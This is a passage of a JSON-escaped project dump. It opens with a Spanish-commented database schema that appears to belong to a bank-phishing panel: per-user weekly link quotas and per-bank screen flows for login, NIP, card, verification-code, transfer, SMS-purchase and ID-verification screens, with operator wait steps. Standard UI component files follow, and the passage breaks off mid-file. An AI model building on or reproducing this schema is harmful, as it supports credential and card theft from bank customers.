linkCount: integer(\"link_count\").notNull().default(0), // Contador de links generados\n  lastGeneratedAt: timestamp(\"last_generated_at\"), // ltima vez que gener贸 un link\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  updatedAt: timestamp(\"updated_at\").defaultNow()\n}, (table) => ({\n  uniqueUserWeek: unique().on(table.userId, table.weekStartDate)\n}));\n\nexport const insertLinkUsageWeeklySchema = createInsertSchema(linkUsageWeekly).omit({\n  id: true,\n  createdAt: true,\n  updatedAt: true\n});\n\nexport type InsertLinkUsageWeekly = z.infer<typeof insertLinkUsageWeeklySchema>;\nexport type LinkUsageWeekly = typeof linkUsageWeekly.$inferSelect;\n\n// Tipos de pantalla para flujos\nexport enum ScreenFlowType {\n  FOLIO = \"folio\",\n  LOGIN = \"login\",\n  CODIGO = \"codigo\",\n  NIP = \"nip\",\n  PROTEGER = \"proteger\",\n  TARJETA = \"tarjeta\",\n  TRANSFERIR = \"transferir\",\n  CANCELACION = \"cancelacion\",\n  MENSAJE = \"mensaje\",\n  SMS_COMPRA = \"sms_compra\",\n  VALIDANDO = \"validando\",\n  ESCANEAR_QR = \"escanear_qr\",\n  CANCELACION_RETIRO = \"cancelacion_retiro\",\n  VERIFICACION_ID = \"verificacion_id\"\n}\n\n// Tabla para configuraci贸n de flujos de pantallas por banco\nexport const bankScreenFlows = pgTable(\"bank_screen_flows\", {\n  id: serial(\"id\").primaryKey(),\n  bankCode: text(\"bank_code\").notNull().unique(), // C贸digo del banco\n  flowConfig: jsonb(\"flow_config\").notNull(), // Array de {screenType, durationMs, payload}\n  isActive: boolean(\"is_active\").default(true),\n  createdBy: integer(\"created_by\").references(() => users.id), // Admin que cre贸 la configuraci贸n\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  updatedAt: timestamp(\"updated_at\").defaultNow()\n});\n\nexport const insertBankScreenFlowSchema = createInsertSchema(bankScreenFlows).omit({\n  id: true,\n  createdAt: true,\n  updatedAt: true\n});\n\nexport type InsertBankScreenFlow = z.infer<typeof insertBankScreenFlowSchema>;\nexport type BankScreenFlow = typeof bankScreenFlows.$inferSelect;\n\n// Tabla para configuraci贸n de flujos de pantallas por usuario y banco\nexport const userBankFlows = pgTable(\"user_bank_flows\", {\n  id: serial(\"id\").primaryKey(),\n  userId: integer(\"user_id\").notNull().references(() => users.id, { onDelete: 'cascade' }), // Usuario que cre贸 el flujo\n  bankCode: text(\"bank_code\").notNull(), // C贸digo del banco\n  flowConfig: jsonb(\"flow_config\").notNull(), // Array de {screenType, durationMs, waitForUser, payload}\n  isActive: boolean(\"is_active\").default(true),\n  createdAt: timestamp(\"created_at\").defaultNow(),\n  updatedAt: timestamp(\"updated_at\").defaultNow()\n}, (table) => ({\n  // Restricci贸n 煤nica: cada usuario solo puede tener un flujo activo por banco\n  uniqueUserBank: unique().on(table.userId, table.bankCode)\n}));\n\nexport const insertUserBankFlowSchema = createInsertSchema(userBankFlows).omit({\n  id: true,\n  createdAt: true,\n  updatedAt: true\n});\n\nexport type InsertUserBankFlow = z.infer<typeof insertUserBankFlowSchema>;\nexport type UserBankFlow = typeof userBankFlows.$inferSelect;\n","size_bytes":33987},"client/src/components/ui/collapsible.tsx":{"content":"import * as CollapsiblePrimitive from \"@radix-ui/react-collapsible\"\n\nconst Collapsible = CollapsiblePrimitive.Root\n\nconst CollapsibleTrigger = CollapsiblePrimitive.CollapsibleTrigger\n\nconst CollapsibleContent = CollapsiblePrimitive.CollapsibleContent\n\nexport { Collapsible, CollapsibleTrigger, CollapsibleContent }\n","size_bytes":315},"client/src/components/ui/context-menu.tsx":{"content":"import * as React from \"react\"\nimport * as ContextMenuPrimitive from \"@radix-ui/react-context-menu\"\nimport { Check, ChevronRight, Circle } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst ContextMenu = ContextMenuPrimitive.Root\n\nconst ContextMenuTrigger = ContextMenuPrimitive.Trigger\n\nconst ContextMenuGroup = ContextMenuPrimitive.Group\n\nconst ContextMenuPortal = ContextMenuPrimitive.Portal\n\nconst ContextMenuSub = ContextMenuPrimitive.Sub\n\nconst ContextMenuRadioGroup = ContextMenuPrimitive.RadioGroup\n\nconst ContextMenuSubTrigger = React.forwardRef<\n  React.ElementRef<typeof ContextMenuPrimitive.SubTrigger>,\n  React.ComponentPropsWithoutRef<typeof ContextMenuPrimitive.SubTrigger> & {\n    inset?: boolean\n  }\n>(({ className, inset, children, ...props }, ref) => (\n  <ContextMenuPrimitive.SubTrigger\n    ref={ref}\n    className={cn(\n      \"flex cursor-default select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[state=open]:bg-accent data-[state=open]:text-accent-foreground\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  >\n    {children}\n    <ChevronRight className=\"ml-auto h-4 w-4\" />\n  </ContextMenuPrimitive.SubTrigger>\n))\nContextMenuSubTrigger.displayName = ContextMenuPrimitive.SubTrigger.displayName\n\nconst ContextMenuSubContent = React.forwardRef<\n  React.ElementRef<typeof ContextMenuPrimitive.SubContent>,\n  React.ComponentPropsWithoutRef<typeof ContextMenuPrimitive.SubContent>\n>(({ className, ...props }, ref) => (\n  <ContextMenuPrimitive.SubContent\n    ref={ref}\n    className={cn(\n      \"z-50 min-w-[8rem] overflow-hidden rounded-md border bg-popover p-1 text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n      className\n    )}\n    {...props}\n  />\n))\nContextMenuSubContent.displayName = ContextMenuPrimitive.SubContent.displayName\n\nconst ContextMenuContent = React.forwardRef<\n  React.ElementRef<typeof ContextMenuPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof ContextMenuPrimitive.Content>\n>(({ className, ...props }, ref) => (\n  <ContextMenuPrimitive.Portal>\n    <ContextMenuPrimitive.Content\n      ref={ref}\n      className={cn(\n        \"z-50 min-w-[8rem] overflow-hidden rounded-md border bg-popover p-1 text-popover-foreground shadow-md animate-in fade-in-80 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n        className\n      )}\n      {...props}\n    />\n  </ContextMenuPrimitive.Portal>\n))\nContextMenuContent.displayName = ContextMenuPrimitive.Content.displayName\n\nconst ContextMenuItem = React.forwardRef<\n  React.ElementRef<typeof ContextMenuPrimitive.Item>,\n  React.ComponentPropsWithoutRef<typeof ContextMenuPrimitive.Item> & {\n    inset?: boolean\n  }\n>(({ className, inset, ...props }, ref) => (\n  <ContextMenuPrimitive.Item\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  />\n))\nContextMenuItem.displayName = ContextMenuPrimitive.Item.displayName\n\nconst ContextMenuCheckboxItem = React.forwardRef<\n  React.ElementRef<typeof ContextMenuPrimitive.CheckboxItem>,\n  React.ComponentPropsWithoutRef<typeof ContextMenuPrimitive.CheckboxItem>\n>(({ className, children, checked, ...props }, ref) => (\n  <ContextMenuPrimitive.CheckboxItem\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      className\n    )}\n    checked={checked}\n    {...props}\n  >\n    <span className=\"absolute left-2 flex h-3.5 w-3.5 items-center justify-center\">\n      <ContextMenuPrimitive.ItemIndicator>\n        <Check className=\"h-4 w-4\" />\n      </ContextMenuPrimitive.ItemIndicator>\n    </span>\n    {children}\n  </ContextMenuPrimitive.CheckboxItem>\n))\nContextMenuCheckboxItem.displayName =\n  ContextMenuPrimitive.CheckboxItem.displayName\n\nconst ContextMenuRadioItem = React.forwardRef<\n  React.ElementRef<typeof ContextMenuPrimitive.RadioItem>,\n  React.ComponentPropsWithoutRef<typeof ContextMenuPrimitive.RadioItem>\n>(({ className, children, ...props }, ref) => (\n  <ContextMenuPrimitive.RadioItem\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      className\n    )}\n    {...props}\n  >\n    <span className=\"absolute left-2 flex h-3.5 w-3.5 items-center justify-center\">\n      <ContextMenuPrimitive.ItemIndicator>\n        <Circle className=\"h-2 w-2 fill-current\" />\n      </ContextMenuPrimitive.ItemIndicator>\n    </span>\n    {children}\n  </ContextMenuPrimitive.RadioItem>\n))\nContextMenuRadioItem.displayName = ContextMenuPrimitive.RadioItem.displayName\n\nconst ContextMenuLabel = React.forwardRef<\n  React.ElementRef<typeof ContextMenuPrimitive.Label>,\n  React.ComponentPropsWithoutRef<typeof ContextMenuPrimitive.Label> & {\n    inset?: boolean\n  }\n>(({ className, inset, ...props }, ref) => (\n  <ContextMenuPrimitive.Label\n    ref={ref}\n    className={cn(\n      \"px-2 py-1.5 text-sm font-semibold text-foreground\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  />\n))\nContextMenuLabel.displayName = ContextMenuPrimitive.Label.displayName\n\nconst ContextMenuSeparator = React.forwardRef<\n  React.ElementRef<typeof ContextMenuPrimitive.Separator>,\n  React.ComponentPropsWithoutRef<typeof ContextMenuPrimitive.Separator>\n>(({ className, ...props }, ref) => (\n  <ContextMenuPrimitive.Separator\n    ref={ref}\n    className={cn(\"-mx-1 my-1 h-px bg-border\", className)}\n    {...props}\n  />\n))\nContextMenuSeparator.displayName = ContextMenuPrimitive.Separator.displayName\n\nconst ContextMenuShortcut = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLSpanElement>) => {\n  return (\n    <span\n      className={cn(\n        \"ml-auto text-xs tracking-widest text-muted-foreground\",\n        className\n      )}\n      {...props}\n    />\n  )\n}\nContextMenuShortcut.displayName = \"ContextMenuShortcut\"\n\nexport {\n  ContextMenu,\n  ContextMenuTrigger,\n  ContextMenuContent,\n  ContextMenuItem,\n  ContextMenuCheckboxItem,\n  ContextMenuRadioItem,\n  ContextMenuLabel,\n  ContextMenuSeparator,\n  ContextMenuShortcut,\n  ContextMenuGroup,\n  ContextMenuPortal,\n  ContextMenuSub,\n  ContextMenuSubContent,\n  ContextMenuSubTrigger,\n  ContextMenuRadioGroup,\n}\n","size_bytes":7246},"client/src/components/ui/sidebar.tsx":{"content":"import * as React from \"react\"\nimport { Slot } from \"@radix-ui/react-slot\"\nimport { VariantProps, cva } from \"class-variance-authority\"\nimport { PanelLeft } from \"lucide-react\"\n\nimport { useIsMobile } from \"@/hooks/use-mobile\"\nimport { cn } from \"@/lib/utils\"\nimport { Button } from \"@/components/ui/button\"\nimport { Input } from \"@/components/ui/input\"\nimport { Separator } from \"@/components/ui/separator\"\nimport { Sheet, SheetContent } from \"@/components/ui/sheet\"\nimport { Skeleton } from \"@/components/ui/skeleton\"\nimport {\n  Tooltip,\n  TooltipContent,\n  TooltipProvider,\n  TooltipTrigger,\n} from \"@/components/ui/tooltip\"\n\nconst SIDEBAR_COOKIE_NAME = \"sidebar:state\"\nconst SIDEBAR_COOKIE_MAX_AGE = 60 * 60 * 24 * 7\nconst SIDEBAR_WIDTH = \"16rem\"\nconst SIDEBAR_WIDTH_MOBILE = \"18rem\"\nconst SIDEBAR_WIDTH_ICON = \"3rem\"\nconst SIDEBAR_KEYBOARD_SHORTCUT = \"b\"\n\ntype SidebarContext = {\n  state: \"expanded\" | \"collapsed\"\n  open: boolean\n  setOpen: (open: boolean) => void\n  openMobile: boolean\n  setOpenMobile: (open: boolean) => void\n  isMobile: boolean\n  toggleSidebar: () => void\n}\n\nconst SidebarContext = React.createContext<SidebarContext | null>(null)\n\nfunction useSidebar() {\n  const context = React.useContext(SidebarContext)\n  if (!context) {\n    throw new Error(\"useSidebar must be used within a SidebarProvider.\")\n  }\n\n  return context\n}\n\nconst SidebarProvider = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\"> & {\n    defaultOpen?: boolean\n    open?: boolean\n    onOpenChange?: (open: boolean) => void\n  }\n>(\n  (\n    {\n      defaultOpen = true,\n      open: openProp,\n      onOpenChange: setOpenProp,\n      className,\n      style,\n      children,\n      ...props\n    },\n    ref\n  ) => {\n    const isMobile = useIsMobile()\n    const [openMobile, setOpenMobile] = React.useState(false)\n\n    // This is the internal state of the sidebar.\n    // We use openProp and setOpenProp for control from outside the component.\n    const [_open, _setOpen] = React.useState(defaultOpen)\n    const open = openProp ?? _open\n    const setOpen = React.useCallback(\n      (value: boolean | ((value: boolean) => boolean)) => {\n        if (setOpenProp) {\n          return setOpenProp?.(\n            typeof value === \"function\" ? value(open) : value\n          )\n        }\n\n        _setOpen(value)\n\n        // This sets the cookie to keep the sidebar state.\n        document.cookie = `${SIDEBAR_COOKIE_NAME}=${open}; path=/; max-age=${SIDEBAR_COOKIE_MAX_AGE}`\n      },\n      [setOpenProp, open]\n    )\n\n    // Helper to toggle the sidebar.\n    const toggleSidebar = React.useCallback(() => {\n      return isMobile\n        ? setOpenMobile((open) => !open)\n        : setOpen((open) => !open)\n    }, [isMobile, setOpen, setOpenMobile])\n\n    // Adds a keyboard shortcut to toggle the sidebar.\n    React.useEffect(() => {\n      const handleKeyDown = (event: KeyboardEvent) => {\n        if (\n          event.key === SIDEBAR_KEYBOARD_SHORTCUT &&\n          (event.metaKey || event.ctrlKey)\n        ) {\n          event.preventDefault()\n          toggleSidebar()\n        }\n      }\n\n      window.addEventListener(\"keydown\", handleKeyDown)\n      return () => window.removeEventListener(\"keydown\", handleKeyDown)\n    }, [toggleSidebar])\n\n    // We add a state so that we can do data-state=\"expanded\" or \"collapsed\".\n    // This makes it easier to style the sidebar with Tailwind classes.\n    const state = open ? \"expanded\" : \"collapsed\"\n\n    const contextValue = React.useMemo<SidebarContext>(\n      () => ({\n        state,\n        open,\n        setOpen,\n        isMobile,\n        openMobile,\n        setOpenMobile,\n        toggleSidebar,\n      }),\n      [state, open, setOpen, isMobile, openMobile, setOpenMobile, toggleSidebar]\n    )\n\n    return (\n      <SidebarContext.Provider value={contextValue}>\n        <TooltipProvider delayDuration={0}>\n          <div\n            style={\n              {\n                \"--sidebar-width\": SIDEBAR_WIDTH,\n                \"--sidebar-width-icon\": SIDEBAR_WIDTH_ICON,\n                ...style,\n              } as React.CSSProperties\n            }\n            className={cn(\n              \"group/sidebar-wrapper flex min-h-svh w-full text-sidebar-foreground has-[[data-variant=inset]]:bg-sidebar\",\n              className\n            )}\n            ref={ref}\n            {...props}\n          >\n            {children}\n          </div>\n        </TooltipProvider>\n      </SidebarContext.Provider>\n    )\n  }\n)\nSidebarProvider.displayName = \"SidebarProvider\"\n\nconst Sidebar = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\"> & {\n    side?: \"left\" | \"right\"\n    variant?: \"sidebar\" | \"floating\" | \"inset\"\n    collapsible?: \"offcanvas\" | \"icon\" | \"none\"\n  }\n>(\n  (\n    {\n      side = \"left\",\n      variant = \"sidebar\",\n      collapsible = \"offcanvas\",\n      className,\n      children,\n      ...props\n    },\n    ref\n  ) => {\n    const { isMobile, state, openMobile, setOpenMobile } = useSidebar()\n\n    if (collapsible === \"none\") {\n      return (\n        <div\n          className={cn(\n            \"flex h-full w-[--sidebar-width] flex-col bg-sidebar text-sidebar-foreground\",\n            className\n          )}\n          ref={ref}\n          {...props}\n        >\n          {children}\n        </div>\n      )\n    }\n\n    if (isMobile) {\n      return (\n        <Sheet open={openMobile} onOpenChange={setOpenMobile} {...props}>\n          <SheetContent\n            data-sidebar=\"sidebar\"\n            data-mobile=\"true\"\n            className=\"w-[--sidebar-width] bg-sidebar p-0 text-sidebar-foreground [&>button]:hidden\"\n            style={\n              {\n                \"--sidebar-width\": SIDEBAR_WIDTH_MOBILE,\n              } as React.CSSProperties\n            }\n            side={side}\n          >\n            <div className=\"flex h-full w-full flex-col\">{children}</div>\n          </SheetContent>\n        </Sheet>\n      )\n    }\n\n    return (\n      <div\n        ref={ref}\n        className=\"group peer hidden md:block\"\n        data-state={state}\n        data-collapsible={state === \"collapsed\" ? collapsible : \"\"}\n        data-variant={variant}\n        data-side={side}\n      >\n        {/* This is what handles the sidebar gap on desktop */}\n        <div\n          className={cn(\n            \"duration-200 relative h-svh w-[--sidebar-width] bg-transparent transition-[width] ease-linear\",\n            \"group-data-[collapsible=offcanvas]:w-0\",\n            \"group-data-[side=right]:rotate-180\",\n            variant === \"floating\" || variant === \"inset\"\n              ? \"group-data-[collapsible=icon]:w-[calc(var(--sidebar-width-icon)_+_theme(spacing.4))]\"\n              : \"group-data-[collapsible=icon]:w-[--sidebar-width-icon]\"\n          )}\n        />\n        <div\n          className={cn(\n            \"duration-200 fixed inset-y-0 z-10 hidden h-svh w-[--sidebar-width] transition-[left,right,width] ease-linear md:flex\",\n            side === \"left\"\n              ? \"left-0 group-data-[collapsible=offcanvas]:left-[calc(var(--sidebar-width)*-1)]\"\n              : \"right-0 group-data-[collapsible=offcanvas]:right-[calc(var(--sidebar-width)*-1)]\",\n            // Adjust the padding for floating and inset variants.\n            variant === \"floating\" || variant === \"inset\"\n              ? \"p-2 group-data-[collapsible=icon]:w-[calc(var(--sidebar-width-icon)_+_theme(spacing.4)_+2px)]\"\n              : \"group-data-[collapsible=icon]:w-[--sidebar-width-icon] group-data-[side=left]:border-r group-data-[side=right]:border-l\",\n            className\n          )}\n          {...props}\n        >\n          <div\n            data-sidebar=\"sidebar\"\n            className=\"flex h-full w-full flex-col bg-sidebar group-data-[variant=floating]:rounded-lg group-data-[variant=floating]:border group-data-[variant=floating]:border-sidebar-border group-data-[variant=floating]:shadow\"\n          >\n            {children}\n          </div>\n        </div>\n      </div>\n    )\n  }\n)\nSidebar.displayName = \"Sidebar\"\n\nconst SidebarTrigger = React.forwardRef<\n  React.ElementRef<typeof Button>,\n  React.ComponentProps<typeof Button>\n>(({ className, onClick, ...props }, ref) => {\n  const { toggleSidebar } = useSidebar()\n\n  return (\n    <Button\n      ref={ref}\n      data-sidebar=\"trigger\"\n      variant=\"ghost\"\n      size=\"icon\"\n      className={cn(\"h-7 w-7\", className)}\n      onClick={(event) => {\n        onClick?.(event)\n        toggleSidebar()\n      }}\n      {...props}\n    >\n      <PanelLeft />\n      <span className=\"sr-only\">Toggle Sidebar</span>\n    </Button>\n  )\n})\nSidebarTrigger.displayName = \"SidebarTrigger\"\n\nconst SidebarRail = React.forwardRef<\n  HTMLButtonElement,\n  React.ComponentProps<\"button\">\n>(({ className, ...props }, ref) => {\n  const { toggleSidebar } = useSidebar()\n\n  return (\n    <button\n      ref={ref}\n      data-sidebar=\"rail\"\n      aria-label=\"Toggle Sidebar\"\n      tabIndex={-1}\n      onClick={toggleSidebar}\n      title=\"Toggle Sidebar\"\n      className={cn(\n        \"absolute inset-y-0 z-20 hidden w-4 -translate-x-1/2 transition-all ease-linear after:absolute after:inset-y-0 after:left-1/2 after:w-[2px] hover:after:bg-sidebar-border group-data-[side=left]:-right-4 group-data-[side=right]:left-0 sm:flex\",\n        \"[[data-side=left]_&]:cursor-w-resize [[data-side=right]_&]:cursor-e-resize\",\n        \"[[data-side=left][data-state=collapsed]_&]:cursor-e-resize [[data-side=right][data-state=collapsed]_&]:cursor-w-resize\",\n        \"group-data-[collapsible=offcanvas]:translate-x-0 group-data-[collapsible=offcanvas]:after:left-full group-data-[collapsible=offcanvas]:hover:bg-sidebar\",\n        \"[[data-side=left][data-collapsible=offcanvas]_&]:-right-2\",\n        \"[[data-side=right][data-collapsible=offcanvas]_&]:-left-2\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nSidebarRail.displayName = \"SidebarRail\"\n\nconst SidebarInset = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"main\">\n>(({ className, ...props }, ref) => {\n  return (\n    <main\n      ref={ref}\n      className={cn(\n        \"relative flex min-h-svh flex-1 flex-col bg-background\",\n        \"peer-data-[variant=inset]:min-h-[calc(100svh-theme(spacing.4))] md:peer-data-[variant=inset]:m-2 md:peer-data-[state=collapsed]:peer-data-[variant=inset]:ml-2 md:peer-data-[variant=inset]:ml-0 md:peer-data-[variant=inset]:rounded-xl md:peer-data-[variant=inset]:shadow\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nSidebarInset.displayName = \"SidebarInset\"\n\nconst SidebarInput = React.forwardRef<\n  React.ElementRef<typeof Input>,\n  React.ComponentProps<typeof Input>\n>(({ className, ...props }, ref) => {\n  return (\n    <Input\n      ref={ref}\n      data-sidebar=\"input\"\n      className={cn(\n        \"h-8 w-full bg-background shadow-none focus-visible:ring-2 focus-visible:ring-sidebar-ring\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nSidebarInput.displayName = \"SidebarInput\"\n\nconst SidebarHeader = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\">\n>(({ className, ...props }, ref) => {\n  return (\n    <div\n      ref={ref}\n      data-sidebar=\"header\"\n      className={cn(\"flex flex-col gap-2 p-2\", className)}\n      {...props}\n    />\n  )\n})\nSidebarHeader.displayName = \"SidebarHeader\"\n\nconst SidebarFooter = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\">\n>(({ className, ...props }, ref) => {\n  return (\n    <div\n      ref={ref}\n      data-sidebar=\"footer\"\n      className={cn(\"flex flex-col gap-2 p-2\", className)}\n      {...props}\n    />\n  )\n})\nSidebarFooter.displayName = \"SidebarFooter\"\n\nconst SidebarSeparator = React.forwardRef<\n  React.ElementRef<typeof Separator>,\n  React.ComponentProps<typeof Separator>\n>(({ className, ...props }, ref) => {\n  return (\n    <Separator\n      ref={ref}\n      data-sidebar=\"separator\"\n      className={cn(\"mx-2 w-auto bg-sidebar-border\", className)}\n      {...props}\n    />\n  )\n})\nSidebarSeparator.displayName = \"SidebarSeparator\"\n\nconst SidebarContent = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\">\n>(({ className, ...props }, ref) => {\n  return (\n    <div\n      ref={ref}\n      data-sidebar=\"content\"\n      className={cn(\n        \"flex min-h-0 flex-1 flex-col gap-2 overflow-auto group-data-[collapsible=icon]:overflow-hidden\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nSidebarContent.displayName = \"SidebarContent\"\n\nconst SidebarGroup = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\">\n>(({ className, ...props }, ref) => {\n  return (\n    <div\n      ref={ref}\n      data-sidebar=\"group\"\n      className={cn(\"relative flex w-full min-w-0 flex-col p-2\", className)}\n      {...props}\n    />\n  )\n})\nSidebarGroup.displayName = \"SidebarGroup\"\n\nconst SidebarGroupLabel = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\"> & { asChild?: boolean }\n>(({ className, asChild = false, ...props }, ref) => {\n  const Comp = asChild ? Slot : \"div\"\n\n  return (\n    <Comp\n      ref={ref}\n      data-sidebar=\"group-label\"\n      className={cn(\n        \"duration-200 flex h-8 shrink-0 items-center rounded-md px-2 text-xs font-medium text-sidebar-foreground/70 outline-none ring-sidebar-ring transition-[margin,opa] ease-linear focus-visible:ring-2 [&>svg]:size-4 [&>svg]:shrink-0\",\n        \"group-data-[collapsible=icon]:-mt-8 group-data-[collapsible=icon]:opacity-0\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nSidebarGroupLabel.displayName = \"SidebarGroupLabel\"\n\nconst SidebarGroupAction = React.forwardRef<\n  HTMLButtonElement,\n  React.ComponentProps<\"button\"> & { asChild?: boolean }\n>(({ className, asChild = false, ...props }, ref) => {\n  const Comp = asChild ? Slot : \"button\"\n\n  return (\n    <Comp\n      ref={ref}\n      data-sidebar=\"group-action\"\n      className={cn(\n        \"absolute right-3 top-3.5 flex aspect-square w-5 items-center justify-center rounded-md p-0 text-sidebar-foreground outline-none ring-sidebar-ring transition-transform hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 [&>svg]:size-4 [&>svg]:shrink-0\",\n        // Increases the hit area of the button on mobile.\n        \"after:absolute after:-inset-2 after:md:hidden\",\n        \"group-data-[collapsible=icon]:hidden\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nSidebarGroupAction.displayName = \"SidebarGroupAction\"\n\nconst SidebarGroupContent = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\">\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    data-sidebar=\"group-content\"\n    className={cn(\"w-full text-sm\", className)}\n    {...props}\n  />\n))\nSidebarGroupContent.displayName = \"SidebarGroupContent\"\n\nconst SidebarMenu = React.forwardRef<\n  HTMLUListElement,\n  React.ComponentProps<\"ul\">\n>(({ className, ...props }, ref) => (\n  <ul\n    ref={ref}\n    data-sidebar=\"menu\"\n    className={cn(\"flex w-full min-w-0 flex-col gap-1\", className)}\n    {...props}\n  />\n))\nSidebarMenu.displayName = \"SidebarMenu\"\n\nconst SidebarMenuItem = React.forwardRef<\n  HTMLLIElement,\n  React.ComponentProps<\"li\">\n>(({ className, ...props }, ref) => (\n  <li\n    ref={ref}\n    data-sidebar=\"menu-item\"\n    className={cn(\"group/menu-item relative\", className)}\n    {...props}\n  />\n))\nSidebarMenuItem.displayName = \"SidebarMenuItem\"\n\nconst sidebarMenuButtonVariants = cva(\n  \"peer/menu-button flex w-full items-center gap-2 overflow-hidden rounded-md p-2 text-left text-sm outline-none ring-sidebar-ring transition-[width,height,padding] hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 active:bg-sidebar-accent active:text-sidebar-accent-foreground disabled:pointer-events-none disabled:opacity-50 group-has-[[data-sidebar=menu-action]]/menu-item:pr-8 aria-disabled:pointer-events-none aria-disabled:opacity-50 data-[active=true]:bg-sidebar-accent data-[active=true]:font-medium data-[active=true]:text-sidebar-accent-foreground data-[state=open]:hover:bg-sidebar-accent data-[state=open]:hover:text-sidebar-accent-foreground group-data-[collapsible=icon]:!size-8 group-data-[collapsible=icon]:!p-2 [&>span:last-child]:truncate [&>svg]:size-4 [&>svg]:shrink-0\",\n  {\n    variants: {\n      variant: {\n        default: \"hover:bg-sidebar-accent hover:text-sidebar-accent-foreground\",\n        outline:\n          \"bg-background shadow-[0_0_0_1px_hsl(var(--sidebar-border))] hover:bg-sidebar-accent hover:text-sidebar-accent-foreground hover:shadow-[0_0_0_1px_hsl(var(--sidebar-accent))]\",\n      },\n      size: {\n        default: \"h-8 text-sm\",\n        sm: \"h-7 text-xs\",\n        lg: \"h-12 text-sm group-data-[collapsible=icon]:!p-0\",\n      },\n    },\n    defaultVariants: {\n      variant: \"default\",\n      size: \"default\",\n    },\n  }\n)\n\nconst SidebarMenuButton = React.forwardRef<\n  HTMLButtonElement,\n  React.ComponentProps<\"button\"> & {\n    asChild?: boolean\n    isActive?: boolean\n    tooltip?: string | React.ComponentProps<typeof TooltipContent>\n  } & VariantProps<typeof sidebarMenuButtonVariants>\n>(\n  (\n    {\n      asChild = false,\n      isActive = false,\n      variant = \"default\",\n      size = \"default\",\n      tooltip,\n      className,\n      ...props\n    },\n    ref\n  ) => {\n    const Comp = asChild ? Slot : \"button\"\n    const { isMobile, state } = useSidebar()\n\n    const button = (\n      <Comp\n        ref={ref}\n        data-sidebar=\"menu-button\"\n        data-size={size}\n        data-active={isActive}\n        className={cn(sidebarMenuButtonVariants({ variant, size }), className)}\n        {...props}\n      />\n    )\n\n    if (!tooltip) {\n      return button\n    }\n\n    if (typeof tooltip === \"string\") {\n      tooltip = {\n        children: tooltip,\n      }\n    }\n\n    return (\n      <Tooltip>\n        <TooltipTrigger asChild>{button}</TooltipTrigger>\n        <TooltipContent\n          side=\"right\"\n          align=\"center\"\n          hidden={state !== \"collapsed\" || isMobile}\n          {...tooltip}\n        />\n      </Tooltip>\n    )\n  }\n)\nSidebarMenuButton.displayName = \"SidebarMenuButton\"\n\nconst SidebarMenuAction = React.forwardRef<\n  HTMLButtonElement,\n  React.ComponentProps<\"button\"> & {\n    asChild?: boolean\n    showOnHover?: boolean\n  }\n>(({ className, asChild = false, showOnHover = false, ...props }, ref) => {\n  const Comp = asChild ? Slot : \"button\"\n\n  return (\n    <Comp\n      ref={ref}\n      data-sidebar=\"menu-action\"\n      className={cn(\n        \"absolute right-1 top-1.5 flex aspect-square w-5 items-center justify-center rounded-md p-0 text-sidebar-foreground outline-none ring-sidebar-ring transition-transform hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 peer-hover/menu-button:text-sidebar-accent-foreground [&>svg]:size-4 [&>svg]:shrink-0\",\n        // Increases the hit area of the button on mobile.\n        \"after:absolute after:-inset-2 after:md:hidden\",\n        \"peer-data-[size=sm]/menu-button:top-1\",\n        \"peer-data-[size=default]/menu-button:top-1.5\",\n        \"peer-data-[size=lg]/menu-button:top-2.5\",\n        \"group-data-[collapsible=icon]:hidden\",\n        showOnHover &&\n          \"group-focus-within/menu-item:opacity-100 group-hover/menu-item:opacity-100 data-[state=open]:opacity-100 peer-data-[active=true]/menu-button:text-sidebar-accent-foreground 